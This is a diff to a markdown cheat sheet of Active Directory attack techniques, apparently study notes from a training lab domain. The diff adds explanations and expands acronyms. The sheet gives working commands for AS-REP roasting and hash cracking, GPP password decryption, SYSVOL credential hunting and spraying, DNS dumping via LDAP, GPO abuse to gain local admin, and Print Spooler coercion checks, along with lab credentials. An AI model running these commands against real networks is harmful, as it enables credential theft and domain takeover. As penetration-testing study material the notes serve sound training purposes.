@@ -47,6 +47,7 @@ Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
 cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\<scriptname>
 ```
+> Quick reference for all miscellaneous misconfiguration checks. Run description-field and PASSWD_NOTREQD checks first — they are fast and often overlooked. Replace domain, DC IP, and credentials for your target environment.
 
 ---
 
@@ -68,9 +69,9 @@ cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\<scriptname>
 
 ## ASREPRoasting
 
-**What it is:** If a user has "Do not require Kerberos pre-authentication" set, anyone can ask the DC for their AS-REP ticket without supplying a password first. The DC responds with a ticket encrypted using that user's password hash. Grab the ticket, take it offline, crack it.
+**What it is:** AS-REP Roasting targets accounts that have "Do not require Kerberos pre-authentication" set. Normally, a user must prove their identity before the Domain Controller (DC) issues a ticket. If pre-auth is disabled, anyone can ask the DC for that user's Authentication Service Reply (AS-REP) ticket with no password at all. The DC replies with a ticket encrypted using that user's password hash. Take the ticket offline and crack it.
 
-**Difference from Kerberoasting:** Kerberoasting needs an SPN and valid credentials to request a TGS. ASREPRoasting needs nothing — just a username. No creds required at all if you can reach the DC.
+**Difference from Kerberoasting:** Kerberoasting needs a Service Principal Name (SPN) and valid credentials to request a Ticket Granting Service (TGS) ticket. AS-REP Roasting needs nothing but a username. No credentials are required if you can reach the DC.
 
 ### Step 1 — Find accounts with pre-auth disabled (Windows)
 
@@ -79,6 +80,7 @@ cd C:\Tools
 Import-Module .\PowerView.ps1
 # Load PowerView so Get-DomainUser is available
 ```
+> Loads PowerView into the current PowerShell session. Must be done before any `Get-Domain*` commands are available.
 
 ```powershell
 Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
@@ -86,6 +88,7 @@ Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,use
 # select = pull only the columns we care about (don't flood output with 50 AD attributes)
 # | fl = format-list so long useraccountcontrol values aren't truncated
 ```
+> Lists all accounts that do not require Kerberos pre-authentication. Any account in this output can be AS-REP roasted without credentials. `| fl` prevents long values from being cut off.
 
 - Any account in this output is immediately vulnerable — no creds needed to target them
 - Note: ygroce also had PASSWD_NOTREQD set — UAC flags stack, so one account can be vulnerable to multiple attacks
@@ -101,6 +104,7 @@ Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,use
 # /format:hashcat = output in $krb5asrep$23$... format (hashcat mode 18200)
 #                   default format is john — specify hashcat explicitly to avoid confusion
 ```
+> Requests and prints the AS-REP hash for a target account. `/nowrap` is critical — a wrapped hash appears complete but is corrupted and will silently exhaust the wordlist without cracking. `/format:hashcat` ensures the hash is in mode 18200 format.
 
 - Output: `$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:CHECKSUM$CIPHERTEXT`
 - The checksum is the first 16 bytes of the encrypted blob — hashcat uses this as the "salt" to verify candidates
@@ -116,6 +120,7 @@ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_a
 # -usersfile = file containing one username per line to check for pre-auth disabled
 #              build this list from earlier enumeration (Kerbrute, LDAP dump, etc.)
 ```
+> Linux version of AS-REP roasting. `-no-pass` means no domain credentials are needed — just a username list. The trailing slash after the domain is required by the impacket argument parser.
 
 - Kerbrute automatically dumps AS-REP hashes during user enumeration if pre-auth is disabled — you may already have them
 - GetNPUsers.py outputs hashes directly to stdout in hashcat-compatible format
@@ -132,6 +137,7 @@ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt -O
 # -O = optimized kernel — limits max password length to 31 chars but dramatically improves speed
 #      use without -O only if you suspect very long passwords (rare in domain environments)
 ```
+> Cracks an AS-REP hash offline. `-m 18200` is AS-REP; compare with `-m 13100` for TGS (Kerberoasting). `-O` is strongly recommended for speed unless you suspect passwords over 31 characters.
 
 ```bash
 # If hashcat exhausts rockyou straight, try with mutation rules:
@@ -148,6 +154,7 @@ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt -r /tmp/rules.rule -O
 # c$1 = capitalize AND append 1 (e.g. Password1)
 # Rockyou + these rules covers the vast majority of real-world domain passwords
 ```
+> Adds common password mutations to rockyou when a straight wordlist fails. The rule file applies transforms like capitalization and appending numbers or symbols. This covers most real-world domain passwords without a full brute force.
 
 - Hash format decoded: `$krb5asrep$23$` → etype 23 = RC4-HMAC (older, crackable) vs etype 17/18 = AES (much harder)
 - Lab result: `ygroce` → password `Pass@word`
@@ -160,6 +167,7 @@ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt -r /tmp/rules.rule -O
 cd C:\Tools
 Import-Module .\PowerView.ps1
 ```
+> Loads PowerView. Required before running any `Get-Domain*` commands.
 
 ```powershell
 Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
@@ -167,6 +175,7 @@ Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.D
 # Select-Object samaccountname,description = only show username and description (ignore the other 40+ AD attributes)
 # Where-Object {$_.Description -ne $null} = filter out users with no description — reduces noise
 ```
+> Finds all accounts that have something written in the Description field. Administrators sometimes store temporary passwords or "do not change" notes here. Any authenticated domain user can read these fields.
 
 - Sample output that shows a hit:
   ```
@@ -192,6 +201,7 @@ Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useracco
 # This UAC flag means the account is exempt from the domain minimum password length policy
 # Result: the account may have a blank password, a 1-character password, or a password shorter than policy requires
 ```
+> Lists accounts flagged as not requiring a password. These accounts may have blank or trivially short passwords. Always test with `nxc smb TARGET -u USERNAME -p ''` to check for a blank password.
 
 - Why it exists: sometimes set during account creation automation, bulk imports, or legacy migrations — and never cleaned up
 - Always test for blank password immediately:
@@ -206,7 +216,7 @@ Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useracco
 
 ## GPP (Group Policy Preferences) Passwords
 
-**Why it works:** In 2012, Microsoft published the AES-256 encryption key used to protect GPP cpassword values in their MSDN documentation (KB2962486). Once the key is public, every cpassword in SYSVOL is trivially decryptable. The patch (MS14-025) prevents NEW passwords from being stored this way, but does NOT remove existing .xml files in SYSVOL. Assessments on environments untouched since pre-2014 almost always find these.
+**Why it works:** In 2012, Microsoft published the AES-256 encryption key used to protect Group Policy Preferences (GPP) cpassword values in their developer documentation (KB2962486). Once the key is public, every cpassword stored in SYSVOL (the domain-wide shared folder on every DC) is trivially decryptable. The patch MS14-025 stops NEW passwords from being stored this way, but it does NOT remove existing XML files. Environments untouched since before 2014 almost always have these files.
 
 ### Find GPP passwords (Linux — netexec)
 
@@ -220,6 +230,7 @@ nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
 #                   3. Automatically decrypts any found cpassword values using the published AES key
 #                   Output shows: username, cpassword (raw), and decrypted plaintext password
 ```
+> Scans SYSVOL for Group Policy Preference (GPP) passwords and decrypts them automatically. Any valid domain credentials work. The Microsoft-published AES key makes decryption instant — no brute force needed.
 
 ### Find autologon credentials (Linux — netexec)
 
@@ -230,6 +241,7 @@ nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
 # These are often for kiosk machines, labs, or legacy workstations
 # Output shows: DefaultUserName, DefaultPassword, DefaultDomain
 ```
+> Finds autologon credentials stored in Group Policy Registry.xml files. These are stored in cleartext — no decryption needed. Common on shared kiosk or lab machines.
 
 ### Decrypt a cpassword manually
 
@@ -239,6 +251,7 @@ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
 # Uses the published AES key to decrypt instantly
 # No brute force — this is a known-key decrypt, always succeeds
 ```
+> Decrypts a GPP cpassword value manually. Paste the raw base64 string from the XML file. Uses the Microsoft-published AES key — this always succeeds instantly.
 
 - Where to look manually if the nxc module misses something:
   ```bash
@@ -263,6 +276,7 @@ ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
 # Every authenticated domain user can read this share — it's designed to be world-readable
 # Look for: .bat, .vbs, .ps1, .cmd files — any script that runs at logon could contain credentials
 ```
+> Lists all logon scripts in SYSVOL. Replace the DC name and domain. Any domain user can read this share. Look for `.bat`, `.vbs`, `.ps1`, and `.cmd` files that might contain hardcoded credentials.
 
 ```powershell
 cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
@@ -272,6 +286,7 @@ cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.
 # strPassword = "Password123"
 # $pass = "AdminPass1"
 ```
+> Reads the content of a SYSVOL script. Look for variable assignments that contain passwords. If a password is found, spray it across all domain computers with `nxc smb SUBNET -u administrator -p 'PASSWORD' --local-auth`.
 
 - Once you find a hardcoded credential, spray it across all domain computers with local-auth:
   ```bash
@@ -285,7 +300,7 @@ cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.
 
 ## DNS Enumeration with adidnsdump
 
-**Why standard DNS queries aren't enough:** When you query DNS normally (`nslookup`, `dig`, `nmap -sn`), you only see records that the DNS server is configured to respond to for your query type. LDAP exposes the raw DNS zone data stored in Active Directory, including records marked as "tombstoned," records for internal services, and records that simply don't have reverse lookups configured. adidnsdump queries DNS via LDAP and shows everything.
+**Why standard DNS queries aren't enough:** Normal DNS queries (`nslookup`, `dig`, `nmap -sn`) only return records the DNS server is set up to answer. Active Directory (AD) stores its DNS data in the Lightweight Directory Access Protocol (LDAP) directory. That means LDAP exposes every DNS record — including tombstoned records, internal service entries, and records without reverse lookups. `adidnsdump` queries DNS through LDAP and shows all of them.
 
 ```bash
 adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
@@ -294,6 +309,7 @@ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
 # Output: records.csv in the current directory
 # Some records show as "?" — these are records adidnsdump found but couldn't resolve via LDAP alone
 ```
+> Dumps all DNS records from AD via Lightweight Directory Access Protocol (LDAP). Normal DNS queries miss records that are only accessible through AD. Use double backslash to escape the domain backslash in the shell.
 
 ```bash
 adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
@@ -301,6 +317,7 @@ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
 # Slower, but fills in the gaps — reveals hosts that exist in DNS but have no PTR record
 # These hidden hosts are often: jump boxes, backup servers, internal web apps, OOB management interfaces
 ```
+> Adds a second pass to resolve unknown records. `-r` makes DNS queries for any "?" entries. This is slower but reveals hosts that standard scans miss — these hidden systems often have weaker security.
 
 ```bash
 head records.csv
@@ -312,12 +329,13 @@ head records.csv
 #   → LOGISTICS host exists on the network but never showed up in nmap scans
 #   → Worth targeting: isolated internal services often have weaker security posture
 ```
+> Reviews the first few lines of the DNS output CSV. The format is `type,name,value`. Look for A records with IP addresses you have not seen before — these are prime pivot targets.
 
 ---
 
 ## GPO Abuse
 
-**Why GPOs matter for attackers:** Group Policy Objects control what happens to computers and users in linked OUs — startup scripts, software installs, registry settings, local group membership. If you have write rights on a GPO, you control everything it applies to. A GPO linked to "Domain Computers" effectively gives you code execution on every machine in the domain.
+**Why Group Policy Objects (GPOs) matter for attackers:** GPOs control what happens to computers and users in linked Organizational Units (OUs) — startup scripts, software installs, registry settings, and local group membership. If you have write rights on a GPO, you control everything in those OUs. A GPO linked to "Domain Computers" effectively gives you code execution on every machine in the domain.
 
 ### Step 1 — List all GPOs
 
@@ -327,6 +345,7 @@ Get-DomainGPO | select displayname
 # select displayname = show just the name — easier to read than the raw GUID output
 # Look for GPOs with names like "Workstation Config", "IT Policy", "Default Policy" — anything an operator might have write access to
 ```
+> Lists all Group Policy Objects (GPOs) in the domain by display name. This is the first step before checking which accounts have write rights over them.
 
 ### Step 2 — Check for Domain Users write rights on GPOs
 
@@ -336,6 +355,7 @@ $sid = Convert-NameToSid "Domain Users"
 # "Domain Users" = every domain account is a member — if this group has GPO write rights, any account you compromise can abuse it
 # $sid now holds S-1-5-21-...-513
 ```
+> Gets the Security Identifier (SID) for Domain Users. Every authenticated user is a member. If Domain Users has write rights on a GPO, every account you compromise can abuse it.
 
 ```powershell
 Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}
@@ -345,6 +365,7 @@ Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}
 # Look for: WriteProperty, WriteDacl, WriteOwner, GenericWrite, GenericAll
 # Any of these = Domain Users (every authenticated user) can modify this GPO
 ```
+> Checks all GPO ACLs for write rights held by Domain Users. Any write-type right means every account you compromise can modify that GPO and push code to linked computers.
 
 ```powershell
 Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
@@ -352,6 +373,7 @@ Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
 # -Guid = look up the GPO by its object GUID
 # Output shows: DisplayName, Owner, linked OUs — tells you what this GPO controls
 ```
+> Converts a raw GUID from the ACL output into a readable GPO name and shows linked OUs. Replace the GUID with the value from your ACL scan.
 
 ### Step 3 — Abuse GPO write rights (SharpGPOAbuse)
 
@@ -363,6 +385,7 @@ Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
 # After the next Group Policy refresh (default: 90 minutes, or gpupdate /force), your user
 # will be local admin on every computer linked to that GPO's OU
 ```
+> Modifies a GPO to add a controlled account to the local Administrators group on all linked computers. Replace `domainuser` with an account you control and the GPO name with the vulnerable one. Changes take effect at the next Group Policy refresh (up to 90 minutes) or immediately with `gpupdate /force`.
 
 - **Scope risk:** GPO changes apply to every computer in every OU the GPO is linked to — confirm the linked OUs before running to avoid making noise on hundreds of machines
 - Alternative payloads: `--AddComputerScript` (immediate startup script) or `--AddUserScript` (runs when any user logs in)
@@ -371,7 +394,7 @@ Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
 
 ## Printer Bug (MS-RPRN / Print Spooler Coercion)
 
-**What it is:** The Print Spooler service exposes an RPC interface (MS-RPRN) that any domain user can call. One of its methods (`RpcRemoteFindFirstPrinterChangeNotification`) forces the target host to authenticate to an attacker-specified server. This "coercion" is the primitive that powers PrintNightmare, relaying attacks, and cross-forest trust abuse.
+**What it is:** The Print Spooler service exposes a Remote Procedure Call (RPC) interface called MS-RPRN. Any domain user can call it. One method (`RpcRemoteFindFirstPrinterChangeNotification`) forces the target host to authenticate back to any server the attacker names. This forced authentication is called "coercion." It is the core primitive behind PrintNightmare, NTLM relay attacks, and cross-forest trust abuse.
 
 ### Check if Print Spooler is running (Windows)
 
@@ -380,6 +403,7 @@ Import-Module .\SecurityAssessment.ps1
 # Load the SecurityAssessment module which contains the Get-SpoolStatus function
 # This is a helper module — not built into Windows or PowerView
 ```
+> Loads the SecurityAssessment helper module. This is a standalone script — it is not part of PowerView or Windows. Must be imported before `Get-SpoolStatus` is available.
 
 ```powershell
 Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
@@ -388,6 +412,7 @@ Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 # True = Print Spooler (Spooler service) is running = host is vulnerable to coercion
 # False = Print Spooler disabled — coercion won't work, but check via RPC too (see below)
 ```
+> Checks whether the Print Spooler service is running on a remote host. `True` means the host is vulnerable to coercion attacks like PrintNightmare. Use the Fully Qualified Domain Name (FQDN) for reliable resolution.
 
 ### Check via RPC (Linux — more reliable)
 
@@ -400,6 +425,7 @@ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
 #   MS-PAR  = Print System Asynchronous Remote Protocol (newer variant, same vulnerability)
 # Both present = Print Spooler is running and remotely accessible = coercion will work
 ```
+> More reliable than the Windows check. Enumerates all RPC endpoints and filters for Print Spooler protocols. No credentials needed — the `@IP` syntax uses anonymous RPC. Replace with your target DC's IP.
 
 - **Coercion attacks that use this:** PrintNightmare (DLL injection), NTLM relay to LDAP (grant DCSync), relay to AD CS (get DC certificate → TGT → DCSync), cross-forest trust abuse with unconstrained delegation
 - Recommendation: always check the DC for Print Spooler at the start of an engagement — it's a near-instant path to domain compromise when combined with AD CS or unconstrained delegation
@@ -417,9 +443,9 @@ Exchange Windows Permissions group
             └─ secretsdump.py → DCSync → full domain compromise
 ```
 
-- This is a default Exchange installation misconfiguration — not something admins deliberately set
-- Any account in the `Exchange Windows Permissions` group can grant themselves DCSync rights
-- Check BloodHound: Node Info → Outbound Object Control, or search for the group and look at its edges
+- This misconfiguration comes from a default Exchange installation. Admins do not set it intentionally.
+- Any account in the `Exchange Windows Permissions` group can grant itself DCSync replication rights.
+- Check BloodHound: Node Info → Outbound Object Control, or search for the group and look at its edges.
 
 ---
 
